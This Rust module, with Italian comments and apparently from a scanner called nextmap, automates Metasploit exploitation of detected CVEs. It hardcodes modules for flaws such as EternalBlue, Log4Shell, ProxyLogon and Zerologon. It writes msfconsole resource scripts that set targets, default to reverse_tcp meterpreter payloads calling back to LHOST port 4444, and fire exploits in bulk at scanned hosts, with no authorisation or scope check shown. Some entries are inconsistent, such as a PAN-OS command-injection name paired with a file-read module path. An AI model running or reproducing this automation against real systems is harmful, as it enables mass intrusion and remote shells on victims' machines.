// src/msf.rs
//! Modulo per integrazione con Metasploit Framework (msfconsole)
//! Supporta auto-exploitation di vulnerabilità CVE rilevate

use std::process::{Command, Stdio};
use std::io::{Write, BufRead, BufReader};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use crate::models::*;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MetasploitExploit {
    pub module_path: String,
    pub name: String,
    pub rank: String,
    pub cve_ids: Vec<String>,
    pub targets: Vec<String>,
    pub required_options: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExploitResult {
    pub success: bool,
    pub module_used: String,
    pub target_info: String,
    pub session_id: Option<u32>,
    pub output: String,
    pub timestamp: String,
}

#[derive(Debug)]
pub struct MetasploitClient {
    msf_path: String,
    exploit_database: HashMap<String, Vec<MetasploitExploit>>,
}

impl MetasploitClient {
    /// Inizializza client Metasploit
    pub fn new(msf_path: Option<String>) -> Result<Self, Box<dyn std::error::Error>> {
        let msf_path = msf_path.unwrap_or_else(|| {
            // Auto-detect msfconsole path
            if cfg!(windows) {
                "C:\\metasploit-framework\\bin\\msfconsole.bat".to_string()
            } else {
                "msfconsole".to_string()
            }
        });

        // Verifica che msfconsole sia installato
        let test = if cfg!(windows) {
            Command::new("cmd")
                .args(&["/C", &msf_path, "-v"])
                .output()
        } else {
            Command::new(&msf_path)
                .arg("-v")
                .output()
        };

        match test {
            Ok(output) if output.status.success() => {
                println!("✅ Metasploit Framework detected: {}", 
                    String::from_utf8_lossy(&output.stdout).trim());
            }
            _ => {
                return Err("❌ Metasploit Framework not found! Install from https://www.metasploit.com/".into());
            }
        }

        let mut client = MetasploitClient {
            msf_path,
            exploit_database: HashMap::new(),
        };

        // Carica database CVE → MSF exploit mapping
        client.load_exploit_mappings()?;

        Ok(client)
    }

    /// Carica mappatura CVE → Metasploit exploits
    fn load_exploit_mappings(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        // Database hardcoded di CVE comuni → MSF modules
        // In produzione, questo può essere caricato da file JSON o database
        
        // CVE-2023-44487 (HTTP/2 Rapid Reset)
        self.exploit_database.insert(
            "CVE-2023-44487".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "auxiliary/dos/http/http2_rst_stream".to_string(),
                    name: "HTTP/2 Rapid Reset DoS".to_string(),
                    rank: "Normal".to_string(),
                    cve_ids: vec!["CVE-2023-44487".to_string()],
                    targets: vec!["nginx".to_string(), "apache".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2023-20198 (Cisco IOS XE)
        self.exploit_database.insert(
            "CVE-2023-20198".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/cisco_ios_xe_webui_privesc".to_string(),
                    name: "Cisco IOS XE Web UI Privilege Escalation".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-20198".to_string()],
                    targets: vec!["Cisco IOS XE".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2023-22515 (Atlassian Confluence)
        self.exploit_database.insert(
            "CVE-2023-22515".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/atlassian_confluence_auth_bypass".to_string(),
                    name: "Atlassian Confluence Privilege Escalation".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-22515".to_string()],
                    targets: vec!["Confluence 8.0.0-8.5.3".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2023-34362 (MOVEit Transfer SQLi)
        self.exploit_database.insert(
            "CVE-2023-34362".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/http/progress_moveit_sqli_rce".to_string(),
                    name: "Progress MOVEit Transfer SQL Injection RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-34362".to_string()],
                    targets: vec!["MOVEit Transfer 2019.0-2023.0.1".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // EternalBlue (MS17-010)
        self.exploit_database.insert(
            "CVE-2017-0144".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/smb/ms17_010_eternalblue".to_string(),
                    name: "MS17-010 EternalBlue SMB RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2017-0144".to_string()],
                    targets: vec!["Windows 7".to_string(), "Windows Server 2008".to_string()],
                    required_options: vec!["RHOSTS".to_string()],
                }
            ]
        );

        // BlueKeep (CVE-2019-0708)
        self.exploit_database.insert(
            "CVE-2019-0708".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/rdp/cve_2019_0708_bluekeep_rce".to_string(),
                    name: "BlueKeep RDP RCE".to_string(),
                    rank: "Manual".to_string(),
                    cve_ids: vec!["CVE-2019-0708".to_string()],
                    targets: vec!["Windows 7".to_string(), "Windows Server 2008".to_string()],
                    required_options: vec!["RHOSTS".to_string()],
                }
            ]
        );

        // Log4Shell (CVE-2021-44228)
        self.exploit_database.insert(
            "CVE-2021-44228".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/log4shell_header_injection".to_string(),
                    name: "Log4Shell Apache Log4j RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2021-44228".to_string()],
                    targets: vec!["Apache Log4j 2.0-2.15.0".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // ===== NUOVI EXPLOIT AGGIUNTI (v0.3.3+) =====

        // CVE-2024-3400 (Palo Alto Networks PAN-OS Command Injection)
        self.exploit_database.insert(
            "CVE-2024-3400".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/panos_arbitrary_file_read".to_string(),
                    name: "Palo Alto Networks PAN-OS Command Injection".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2024-3400".to_string()],
                    targets: vec!["PAN-OS 10.2".to_string(), "PAN-OS 11.0".to_string(), "PAN-OS 11.1".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2023-46604 (Apache ActiveMQ RCE)
        self.exploit_database.insert(
            "CVE-2023-46604".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/misc/apache_activemq_rce_cve_2023_46604".to_string(),
                    name: "Apache ActiveMQ OpenWire Deserialization RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-46604".to_string()],
                    targets: vec!["ActiveMQ 5.18.0-5.18.2".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2023-4966 (Citrix Bleed - NetScaler ADC/Gateway Buffer Overflow)
        self.exploit_database.insert(
            "CVE-2023-4966".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "auxiliary/gather/citrix_netscaler_adc_vpn_key_disclosure".to_string(),
                    name: "Citrix NetScaler ADC/Gateway Session Token Disclosure".to_string(),
                    rank: "Normal".to_string(),
                    cve_ids: vec!["CVE-2023-4966".to_string()],
                    targets: vec!["NetScaler ADC".to_string(), "NetScaler Gateway".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2023-27350 (PaperCut NG/MF RCE)
        self.exploit_database.insert(
            "CVE-2023-27350".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/papercut_ng_auth_bypass_rce".to_string(),
                    name: "PaperCut NG/MF Authentication Bypass RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2023-27350".to_string()],
                    targets: vec!["PaperCut NG 8.0-22.0.9".to_string(), "PaperCut MF 8.0-22.0.9".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2022-41040 + CVE-2022-41082 (ProxyNotShell - Microsoft Exchange)
        self.exploit_database.insert(
            "CVE-2022-41040".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/http/exchange_proxynotshell_rce".to_string(),
                    name: "Microsoft Exchange ProxyNotShell RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2022-41040".to_string(), "CVE-2022-41082".to_string()],
                    targets: vec!["Exchange Server 2013-2019".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string(), "EMAIL".to_string()],
                }
            ]
        );

        // CVE-2022-26134 (Atlassian Confluence OGNL Injection)
        self.exploit_database.insert(
            "CVE-2022-26134".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/atlassian_confluence_ognl_injection".to_string(),
                    name: "Atlassian Confluence OGNL Injection RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2022-26134".to_string()],
                    targets: vec!["Confluence Server".to_string(), "Confluence Data Center".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2022-22965 (Spring4Shell - Spring Framework RCE)
        self.exploit_database.insert(
            "CVE-2022-22965".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/spring_framework_rce_spring4shell".to_string(),
                    name: "Spring Framework Class Property RCE (Spring4Shell)".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2022-22965".to_string()],
                    targets: vec!["Spring Framework 5.3.0-5.3.17".to_string(), "Spring Framework 5.2.0-5.2.19".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2021-34473 (Microsoft Exchange ProxyShell)
        self.exploit_database.insert(
            "CVE-2021-34473".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/http/exchange_proxyshell_rce".to_string(),
                    name: "Microsoft Exchange ProxyShell RCE Chain".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2021-34473".to_string(), "CVE-2021-34523".to_string(), "CVE-2021-31207".to_string()],
                    targets: vec!["Exchange Server 2013-2019".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string(), "EMAIL".to_string()],
                }
            ]
        );

        // CVE-2021-26855 (Microsoft Exchange ProxyLogon)
        self.exploit_database.insert(
            "CVE-2021-26855".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/http/exchange_proxylogon_rce".to_string(),
                    name: "Microsoft Exchange ProxyLogon RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2021-26855".to_string()],
                    targets: vec!["Exchange Server 2013-2019".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string(), "EMAIL".to_string()],
                }
            ]
        );

        // CVE-2020-1472 (Zerologon - Windows Netlogon Privilege Escalation)
        self.exploit_database.insert(
            "CVE-2020-1472".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "auxiliary/admin/dcerpc/cve_2020_1472_zerologon".to_string(),
                    name: "Zerologon Windows Netlogon Privilege Escalation".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2020-1472".to_string()],
                    targets: vec!["Windows Server 2008-2019".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "NBNAME".to_string()],
                }
            ]
        );

        // CVE-2019-19781 (Citrix ADC/Gateway Path Traversal)
        self.exploit_database.insert(
            "CVE-2019-19781".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/linux/http/citrix_adc_vpn_traversal".to_string(),
                    name: "Citrix ADC/Gateway Directory Traversal RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2019-19781".to_string()],
                    targets: vec!["Citrix ADC".to_string(), "Citrix Gateway".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2018-13379 (Fortinet FortiOS SSL VPN Path Traversal)
        self.exploit_database.insert(
            "CVE-2018-13379".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "auxiliary/gather/fortinet_ssl_vpn_traversal".to_string(),
                    name: "Fortinet FortiOS SSL VPN Credentials Disclosure".to_string(),
                    rank: "Normal".to_string(),
                    cve_ids: vec!["CVE-2018-13379".to_string()],
                    targets: vec!["FortiOS 5.4.6-6.0.4".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2018-7600 (Drupalgeddon2 - Drupal RCE)
        self.exploit_database.insert(
            "CVE-2018-7600".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/unix/webapp/drupal_drupalgeddon2".to_string(),
                    name: "Drupal Drupalgeddon 2 Forms API RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2018-7600".to_string()],
                    targets: vec!["Drupal 7.x-8.5.0".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2017-5638 (Apache Struts2 RCE)
        self.exploit_database.insert(
            "CVE-2017-5638".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/struts2_content_type_ognl".to_string(),
                    name: "Apache Struts2 Jakarta Multipart Parser OGNL RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2017-5638".to_string()],
                    targets: vec!["Struts 2.3.5-2.3.31".to_string(), "Struts 2.5-2.5.10".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2017-0199 (Microsoft Office/WordPad RCE)
        self.exploit_database.insert(
            "CVE-2017-0199".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/fileformat/office_word_hta".to_string(),
                    name: "Microsoft Office Word Malicious HTA Execution".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2017-0199".to_string()],
                    targets: vec!["Microsoft Office 2007-2016".to_string()],
                    required_options: vec!["SRVHOST".to_string(), "SRVPORT".to_string()],
                }
            ]
        );

        // CVE-2014-6271 (Shellshock - Bash RCE)
        self.exploit_database.insert(
            "CVE-2014-6271".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/apache_mod_cgi_bash_env_exec".to_string(),
                    name: "Shellshock Apache mod_cgi Bash Environment Variable RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2014-6271".to_string()],
                    targets: vec!["Apache with mod_cgi".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string(), "TARGETURI".to_string()],
                }
            ]
        );

        // CVE-2012-1823 (PHP CGI Argument Injection)
        self.exploit_database.insert(
            "CVE-2012-1823".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/multi/http/php_cgi_arg_injection".to_string(),
                    name: "PHP CGI Argument Injection RCE".to_string(),
                    rank: "Excellent".to_string(),
                    cve_ids: vec!["CVE-2012-1823".to_string()],
                    targets: vec!["PHP 5.3.x".to_string(), "PHP 5.4.x".to_string()],
                    required_options: vec!["RHOSTS".to_string(), "RPORT".to_string()],
                }
            ]
        );

        // CVE-2008-4250 (MS08-067 - Windows Server Service RCE)
        self.exploit_database.insert(
            "CVE-2008-4250".to_string(),
            vec![
                MetasploitExploit {
                    module_path: "exploit/windows/smb/ms08_067_netapi".to_string(),
                    name: "MS08-067 Microsoft Server Service RCE".to_string(),
                    rank: "Great".to_string(),
                    cve_ids: vec!["CVE-2008-4250".to_string()],
                    targets: vec!["Windows XP SP2/SP3".to_string(), "Windows Server 2003 SP1/SP2".to_string()],
                    required_options: vec!["RHOSTS".to_string()],
                }
            ]
        );

        println!("📊 Loaded {} CVE → MSF exploit mappings", self.exploit_database.len());
        Ok(())
    }

    /// Cerca exploits disponibili per un CVE
    pub fn find_exploits_for_cve(&self, cve_id: &str) -> Vec<&MetasploitExploit> {
        self.exploit_database
            .get(cve_id)
            .map(|v| v.iter().collect())
            .unwrap_or_default()
    }

    /// Esegue exploit automatico per una vulnerabilità
    pub async fn auto_exploit(
        &self,
        cve_id: &str,
        target_ip: &str,
        target_port: u16,
        payload: Option<&str>,
        lhost: Option<&str>,
        lport: Option<u16>,
    ) -> Result<ExploitResult, Box<dyn std::error::Error>> {
        
        let exploits = self.find_exploits_for_cve(cve_id);
        
        if exploits.is_empty() {
            return Err(format!("No Metasploit exploit found for {}", cve_id).into());
        }

        // Usa il primo exploit disponibile (rank più alto)
        let exploit = exploits[0];

        println!("🎯 Launching Metasploit exploit: {}", exploit.name);
        println!("   Module: {}", exploit.module_path);
        println!("   Target: {}:{}", target_ip, target_port);

        // Costruisci comandi msfconsole
        let mut commands = vec![
            format!("use {}", exploit.module_path),
            format!("set RHOSTS {}", target_ip),
            format!("set RPORT {}", target_port),
        ];

        // Payload configuration
        if let Some(payload_name) = payload {
            commands.push(format!("set PAYLOAD {}", payload_name));
        } else {
            // Default payload basato su tipo exploit
            if exploit.module_path.contains("windows") {
                commands.push("set PAYLOAD windows/meterpreter/reverse_tcp".to_string());
            } else {
                commands.push("set PAYLOAD linux/x86/meterpreter/reverse_tcp".to_string());
            }
        }

        // LHOST/LPORT for reverse shells
        if let Some(lhost_val) = lhost {
            commands.push(format!("set LHOST {}", lhost_val));
        }
        if let Some(lport_val) = lport {
            commands.push(format!("set LPORT {}", lport_val));
        } else {
            commands.push("set LPORT 4444".to_string());
        }

        // Exploit options
        commands.push("check".to_string());  // Verifica vulnerabilità
        commands.push("exploit -z".to_string());  // Exploit con background session
        commands.push("sessions -l".to_string());  // Lista sessioni
        commands.push("exit".to_string());

        // Esegui msfconsole
        let output = self.run_msfconsole_commands(&commands)?;

        // Parse output per determinare successo
        let success = output.contains("[+]") || output.contains("Meterpreter session");
        let session_id = extract_session_id(&output);

        Ok(ExploitResult {
            success,
            module_used: exploit.module_path.clone(),
            target_info: format!("{}:{}", target_ip, target_port),
            session_id,
            output,
            timestamp: chrono::Utc::now().to_rfc3339(),
        })
    }

    /// Esegue comandi msfconsole via resource script
    fn run_msfconsole_commands(&self, commands: &[String]) -> Result<String, Box<dyn std::error::Error>> {
        // Crea resource script temporaneo
        let resource_script = commands.join("\n");
        let script_path = "nextmap_msf_auto.rc";
        
        std::fs::write(script_path, resource_script)?;

        // Esegui msfconsole con resource script
        let output = if cfg!(windows) {
            Command::new("cmd")
                .args(&["/C", &self.msf_path, "-q", "-r", script_path])
                .output()?
        } else {
            Command::new(&self.msf_path)
                .args(&["-q", "-r", script_path])
                .output()?
        };

        // Cleanup
        let _ = std::fs::remove_file(script_path);

        Ok(String::from_utf8_lossy(&output.stdout).to_string())
    }

    /// Esegue scan di vulnerabilità con moduli auxiliary
    pub async fn run_auxiliary_scan(
        &self,
        module: &str,
        target_ip: &str,
        target_port: u16,
    ) -> Result<String, Box<dyn std::error::Error>> {
        
        let commands = vec![
            format!("use {}", module),
            format!("set RHOSTS {}", target_ip),
            format!("set RPORT {}", target_port),
            "run".to_string(),
            "exit".to_string(),
        ];

        self.run_msfconsole_commands(&commands)
    }

    /// Lista tutti gli exploits disponibili nel database
    pub fn list_available_exploits(&self) -> Vec<(&String, &Vec<MetasploitExploit>)> {
        self.exploit_database.iter().collect()
    }
}

/// Estrae Session ID dall'output di msfconsole
fn extract_session_id(output: &str) -> Option<u32> {
    // Cerca pattern: "Meterpreter session 1 opened"
    for line in output.lines() {
        if line.contains("session") && line.contains("opened") {
            // Estrai numero sessione
            let words: Vec<&str> = line.split_whitespace().collect();
            for (i, word) in words.iter().enumerate() {
                if word.contains("session") && i + 1 < words.len() {
                    if let Ok(session_id) = words[i + 1].parse::<u32>() {
                        return Some(session_id);
                    }
                }
            }
        }
    }
    None
}

/// Auto-exploitation di host vulnerabili da scan results
pub async fn auto_exploit_scan_results(
    scan_results: &ScanResult,
    msf_client: &MetasploitClient,
    lhost: &str,
    dry_run: bool,
) -> Vec<ExploitResult> {
    
    let mut results = Vec::new();

    for host in &scan_results.hosts {
        println!("\n🎯 Processing host: {}", host.ip_address);
        
        for vuln in &host.vulnerabilities {
            // Salta vulnerabilità informative
            if vuln.severity == "Info" || vuln.severity == "Low" {
                continue;
            }

            println!("  🔍 Found {} ({}) on port {}", 
                vuln.cve_id, vuln.severity, vuln.service_port);

            // Cerca exploit disponibile
            let exploits = msf_client.find_exploits_for_cve(&vuln.cve_id);
            
            if exploits.is_empty() {
                println!("    ⚠️ No Metasploit exploit available");
                continue;
            }

            if dry_run {
                println!("    🔹 [DRY-RUN] Would exploit with: {}", exploits[0].module_path);
                continue;
            }

            // Esegui exploit
            match msf_client.auto_exploit(
                &vuln.cve_id,
                &host.ip_address,
                vuln.service_port,
                None,  // Auto-select payload
                Some(lhost),
                Some(4444),
            ).await {
                Ok(result) => {
                    if result.success {
                        println!("    ✅ Exploit successful! Session ID: {:?}", result.session_id);
                    } else {
                        println!("    ❌ Exploit failed");
                    }
                    results.push(result);
                }
                Err(e) => {
                    println!("    ❌ Error: {}", e);
                }
            }
        }
    }

    results
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_session_id_extraction() {
        let output = "[*] Meterpreter session 3 opened (192.168.1.100:4444 -> 192.168.1.50:49152)";
        assert_eq!(extract_session_id(output), Some(3));
        
        let no_session = "No session opened";
        assert_eq!(extract_session_id(no_session), None);
    }

    #[tokio::test]
    async fn test_exploit_database_loading() {
        // Questo test funziona solo se MSF è installato
        if let Ok(client) = MetasploitClient::new(None) {
            assert!(!client.exploit_database.is_empty());
            
            // Verifica CVE comuni
            assert!(client.find_exploits_for_cve("CVE-2017-0144").len() > 0); // EternalBlue
            assert!(client.find_exploits_for_cve("CVE-2021-44228").len() > 0); // Log4Shell
        }
    }
}
